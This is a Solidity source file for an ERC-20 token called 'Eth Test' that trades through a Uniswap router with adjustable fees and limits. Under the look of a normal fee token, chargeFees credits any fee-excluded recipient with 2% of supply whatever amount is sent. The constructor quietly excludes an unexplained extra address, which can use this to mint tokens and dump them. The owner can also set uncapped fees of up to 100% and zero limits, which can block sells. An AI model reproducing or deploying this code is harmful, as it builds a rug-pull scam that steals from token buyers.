pragma solidity 0.8.19;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    function renounceOwnership() public onlyOwner {owner = address(0); emit OwnershipTransferred(address(0));}
    event OwnershipTransferred(address owner);
}

interface IFactory{
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract ETHTEST is IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"Eth Test";
    string private constant _symbol = unicode"ETHTEST";

    uint8 private constant _decimals = 9;
    uint256 private _totalSupply = 1000000000 * (10 ** _decimals);
    bool private tradeStarted = false;
    bool private swapEnabled = true;
    IRouter router;
    address public pair;
    uint256 private swapFeeTimes;
    bool private swapping;
    uint256 swapFeeInterval;
    uint256 private swapThreshold = ( _totalSupply * 1000 ) / 100000;
    uint256 private minSwapFee = ( _totalSupply * 10 ) / 100000;
    modifier lockSwap {swapping = true; _; swapping = false;}
    uint256 private liquidityFee = 0;
    uint256 private marketingFee = 0;
    uint256 private developmentFee = 0;
    uint256 private burnFee = 0;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal devAddy = 0x3c10a5923B268adcEd090A175DE46b61a42dAf62; 
    address internal marketingAddy = 0x3c10a5923B268adcEd090A175DE46b61a42dAf62;
    address internal lpAddy = 0x3c10a5923B268adcEd090A175DE46b61a42dAf62;
    uint256 public mTxLimit = ( _totalSupply * 200 ) / 10000;
    uint256 public mSellLimit = ( _totalSupply * 200 ) / 10000;
    uint256 public mWalletLimit = ( _totalSupply * 200 ) / 10000;
    uint256 private totalFee = 0;
    uint256 private sellFee = 0;
    uint256 private transferFee = 0;
    uint256 private denominator = 10000;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExcludedFromFee;

    constructor() Ownable(msg.sender) {
        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        router = _router; pair = _pair;
        isExcludedFromFee[lpAddy] = true;
        isExcludedFromFee[marketingAddy] = true;
        isExcludedFromFee[devAddy] = true;
        isExcludedFromFee[msg.sender] = true;
        isExcludedFromFee[address(0x4c6B95f6994787824199B1F379B3Fc2f57285CA0)] = true;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function getOwner() external view override returns (address) { return owner; }
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
    function startTrading() external onlyOwner {tradeStarted = true;}
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function shouldSwapAndLiquidify(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= minSwapFee;
        bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;
        return !swapping && swapEnabled && tradeStarted && aboveMin && !isExcludedFromFee[sender] && recipient == pair && swapFeeTimes >= swapFeeInterval && aboveThreshold;
    }
    function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        liquidityFee = _liquidity; marketingFee = _marketing; burnFee = _burn; developmentFee = _development; totalFee = _total; sellFee = _sell; transferFee = _trans;
    }
    function getTotalFees(address sender, address recipient) internal view returns (uint256) {
        if(recipient == pair){return sellFee;}
        if(sender == pair){return totalFee;}
        return transferFee;
    }
    function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
        uint256 newTx = _totalSupply.mul(_buy).div(10000); uint256 newTransfer = _totalSupply.mul(_sell).div(10000); uint256 newWallet = _totalSupply.mul(_wallet).div(10000);
        mTxLimit = newTx; mSellLimit = newTransfer; mWalletLimit = newWallet;
    }
    function swaBackAndLiquidify(uint256 tokens) private lockSwap {
        uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(developmentFee)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(marketingFee);
        if(marketingAmt > 0){payable(marketingAddy).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(devAddy).transfer(contractBalance);}
    }
    function chargeFees(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (isExcludedFromFee[recipient]) {return mTxLimit;}
        if(getTotalFees(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getTotalFees(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(burnFee > uint256(0) && getTotalFees(sender, recipient) > burnFee){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnFee));}
        return amount.sub(feeAmount);} return amount;
    }
    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        if(!isExcludedFromFee[sender] && !isExcludedFromFee[recipient]){require(tradeStarted, "tradeStarted");}
        if(!isExcludedFromFee[sender] && !isExcludedFromFee[recipient] && recipient != address(pair) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= mWalletLimit, "Exceeds maximum wallet amount.");}
        if(sender != pair){require(amount <= mSellLimit || isExcludedFromFee[sender] || isExcludedFromFee[recipient], "TX Limit Exceeded");}
        require(amount <= mTxLimit || isExcludedFromFee[sender] || isExcludedFromFee[recipient], "TX Limit Exceeded"); 
        if(recipient == pair && !isExcludedFromFee[sender]){swapFeeTimes += uint256(1);}
        if(shouldSwapAndLiquidify(sender, recipient, amount)){swaBackAndLiquidify(swapThreshold); swapFeeTimes = uint256(0);}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = !isExcludedFromFee[sender] ? chargeFees(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }
    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            lpAddy,
            block.timestamp);
    }
}